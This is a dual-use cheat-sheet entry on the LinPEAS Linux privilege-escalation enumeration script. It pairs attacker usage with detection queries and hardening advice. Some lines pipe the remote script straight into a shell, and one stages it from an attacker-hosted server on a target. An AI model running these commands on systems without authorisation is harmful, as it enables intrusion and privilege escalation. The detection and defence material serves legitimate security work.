name: LinPEAS - Linux Privilege Escalation Enumeration
description: LinPEAS is the de-facto Linux privilege escalation enumeration script. It automatically audits the host for hundreds of privesc vectors - SUID/SGID binaries, sudo rules, capabilities, cron jobs, writable files, kernel exploits, credentials in files, container escapes, and more - and color-codes findings by likelihood (red/yellow = probably exploitable). First tool to run after landing a Linux shell.
notes:
=== RUN FROM MEMORY (no disk write) ===
  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
  wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O- | sh

=== TRANSFER + RUN (no egress) ===
  # Attacker:
  python3 -m http.server 80
  # Target:
  wget http://<lhost>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh

=== USEFUL OPTIONS ===
  ./linpeas.sh -a            # all checks (thorough, slower)
  ./linpeas.sh -s            # stealth/superfast (fewer, quieter checks)
  ./linpeas.sh -e            # extra/deep enumeration
  ./linpeas.sh -o SysI,Devs  # only specific check groups
  ./linpeas.sh | tee linpeas_out.txt   # keep output

=== SAVE COLOR OUTPUT TO VIEW LATER ===
  ./linpeas.sh -a > linpeas.txt 2>&1
  less -r linpeas.txt   # preserve ANSI colors

=== READING RESULTS ===
  # RED/YELLOW highlight = 95% likely a privesc vector
  # RED = almost certainly exploitable
  # Focus on: SUID, sudo -l, capabilities, cron, writable service files, creds

=== ALTERNATIVES / COMPLEMENTS ===
  linux-exploit-suggester.sh   # kernel CVE matching
  pspy                          # watch cron/process activity live
  LinEnum.sh, lse.sh            # lighter scripts
  # Always verify LinPEAS findings manually

recommended.note: Match kernel version to public exploits after LinPEAS.
Manually exploit SUID/SGID binaries LinPEAS flags.
Watch cron/process activity LinPEAS hints at.

defense.why_it_works: LinPEAS reads world-readable system state (binaries, config, process list, cron, sudo rules) that any user can enumerate. It is loud but uses only normal read operations, so it rarely errors out.
defense.prerequisites: Any shell on the target (even low-priv); a shell interpreter.
defense.impact: Rapid, comprehensive mapping of every local privilege-escalation vector.
defense.detection: [MITRE T1082/T1083] Burst of enumeration commands (id, sudo -l, uname, find / -perm, cat of many config files) in seconds; download of linpeas.sh; large sequential file reads.
defense.artifacts: linpeas.sh on disk or in bash history; auditd execve spikes; process spawning hundreds of child commands rapidly.
defense.splunk_spl:
index=linux (process_name IN ("find","sudo","uname","getcap") OR CommandLine="*linpeas*")
| bin _time span=1m
| stats count by host, user
| where count > 50
defense.sentinel_kql:
let win=1m;
Syslog
| where SyslogMessage has "linpeas" or SyslogMessage has_any ("sudo -l","getcap -r")
| summarize count() by Computer, bin(TimeGenerated, win)
defense.prevention: Harden the host so enumeration yields nothing (no exploitable SUID, least-privilege sudo, patched kernel, no creds in files); auditd alerting on mass enumeration; EDR on Linux; minimal toolchain on servers.

detections.name: Mass local enumeration (LinPEAS-style)
detections.logic: process.name:("find" or "getcap" or "sudo" or "uname") and event.action:"exec"
detections.tuning: Correlate many enumeration execs from one PID/session in a short window; exclude known automation accounts
